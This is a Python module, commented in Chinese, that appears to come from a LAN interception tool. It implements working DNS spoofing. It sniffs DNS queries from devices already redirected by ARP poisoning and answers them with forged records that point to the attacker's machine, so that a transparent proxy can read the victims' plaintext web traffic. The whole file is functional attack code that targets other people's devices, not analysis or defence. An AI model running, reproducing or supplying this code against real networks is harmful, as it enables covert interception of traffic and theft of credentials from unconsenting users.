# -*- coding: utf-8 -*-
"""
DNS 引流（DNS Spoof）
=====================

ARP 牵引只能让流量经过本机，目标设备访问网站时目的 IP 仍然是真实服务器，
Reqable / Fiddler 这类**本地代理无法看到**（它们只拦截本机进程发起的连接）。

要让目标设备访问的网站内容直接呈现在本机，标准做法是配合 DNS 引流：

    1. ARP 牵引：目标设备的流量先到本机（否则它的 DNS 请求也无法到达）
    2. DNS 引流：收到 DNS 查询时抢先应答「A 记录 = 本机 IP」
    3. 目标设备于是直连本机 80/443，本机的透明代理（core.mitm）即可拿到明文

这与 bettercap 的 arp.spoof + dns.spoof 组合思路一致。
"""

from __future__ import annotations

import threading
import time

from .logging_bus import log
from .arpmitm import resolve_own_mac

# 这些域名不劫持：本地解析、反查、组播等
DEFAULT_EXCLUDE = (
    ".local", ".arpa", ".lan", ".home", ".internal", ".localhost",
    "in-addr.arpa", "ip6.arpa", "msftconnecttest.com", "msftncsi.com",
)


class DnsSpoofer(threading.Thread):
    """
    监听被牵引设备的 DNS 查询，用指定 IP 作答。

    victims: {ip: mac}  只处理这些来源
    spoof_ip: 应答用的 IP（一般是本机在局域网里的 IP）
    only: 只劫持匹配这些子串的域名（为空表示全部都劫持）
    """

    def __init__(self, iface, victims: dict[str, str], spoof_ip: str,
                 only: list[str] | None = None, exclude: list[str] | None = None,
                 on_event=None) -> None:
        super().__init__(daemon=True, name="DnsSpoofer")
        self.iface = iface
        self.victims = {ip: (mac or "").lower() for ip, mac in victims.items()}
        self.spoof_ip = spoof_ip
        self.only = [s.lower() for s in (only or [])]
        self.exclude = tuple(DEFAULT_EXCLUDE) + tuple(s.lower() for s in (exclude or []))
        self.on_event = on_event
        self._stop_evt = threading.Event()
        self._sniffer = None
        # 本机 MAC：必须显式写进 Ether(src=...)，否则 scapy 会按包的路由去取，
        # 拿到 conf.iface（很可能是 Loopback）的全零 MAC，帧会被直接丢弃。
        self.our_mac = resolve_own_mac(iface)
        self.stats = {"seen": 0, "spoofed": 0, "skipped": 0, "errors": 0}
        self.recent: list[tuple[str, str, str]] = []      # (时间, 来源, 域名)

    # ---------------- 线程 ----------------

    def run(self) -> None:
        try:
            from scapy.all import AsyncSniffer
        except Exception as exc:
            log(f"DNS 引流启动失败：{exc}", "error", "dns")
            return
        try:
            self._sniffer = AsyncSniffer(iface=self.iface.l2_name or None,
                                         filter="udp port 53",
                                         prn=self._handle, store=False)
            self._sniffer.start()
        except Exception as exc:
            log(f"DNS 监听失败（需要管理员 + Npcap）：{exc}", "error", "dns")
            return

        log(f"DNS 引流已启动：{len(self.victims)} 个目标 -> {self.spoof_ip}",
            "success", "dns")
        while not self._stop_evt.is_set():
            time.sleep(0.3)
        try:
            self._sniffer.stop()
        except Exception:
            pass
        log("DNS 引流已停止", "info", "dns")

    def stop(self) -> None:
        self._stop_evt.set()
        if self.is_alive():
            self.join(timeout=4)

    # ---------------- 处理 ----------------

    def _skip(self, qname: str) -> bool:
        low = qname.lower().rstrip(".")
        if any(low.endswith(x) or x in low for x in self.exclude):
            return True
        if self.only:
            return not any(s in low for s in self.only)
        return False

    def _handle(self, pkt) -> None:
        try:
            from scapy.all import DNS, DNSRR, Ether, IP, UDP
        except Exception:
            return
        try:
            if not pkt.haslayer(DNS) or not pkt.haslayer(IP):
                return
            dns = pkt[DNS]
            if int(dns.qr) != 0 or dns.qd is None:          # 只看查询
                return
            src = pkt[IP].src
            if src not in self.victims:
                return
            self.stats["seen"] += 1

            qd = dns.qd
            qname = qd.qname.decode("ascii", "ignore").rstrip(".")
            qtype = int(qd.qtype)
            if qtype not in (1, 28):                        # 只劫持 A / AAAA
                self.stats["skipped"] += 1
                return
            if self._skip(qname):
                self.stats["skipped"] += 1
                return

            dst_mac = self.victims.get(src) or "ff:ff:ff:ff:ff:ff"
            if qtype == 1:
                answer = DNSRR(rrname=qd.qname, type="A", ttl=60, rdata=self.spoof_ip)
            else:
                answer = DNSRR(rrname=qd.qname, type="AAAA", ttl=60,
                               rdata="::1")                 # AAAA 指向本地，逼它走 IPv4

            resp = (Ether(src=self.our_mac, dst=dst_mac)
                    / IP(src=pkt[IP].dst, dst=src)
                    / UDP(sport=int(pkt[UDP].dport), dport=int(pkt[UDP].sport))
                    / DNS(id=int(dns.id), qr=1, aa=1, rd=int(dns.rd), ra=1,
                          qd=qd, an=answer))
            from .rawsock import send_packets
            send_packets([resp], self.iface.l2_name or "")
            self.stats["spoofed"] += 1
            self.recent.append((time.strftime("%H:%M:%S"), src, qname))
            if len(self.recent) > 300:
                del self.recent[:100]
            if self.on_event:
                try:
                    self.on_event(src, qname)
                except Exception:
                    pass
        except Exception as exc:
            self.stats["errors"] += 1
            log(f"DNS 处理出错：{type(exc).__name__}: {exc}", "debug", "dns")
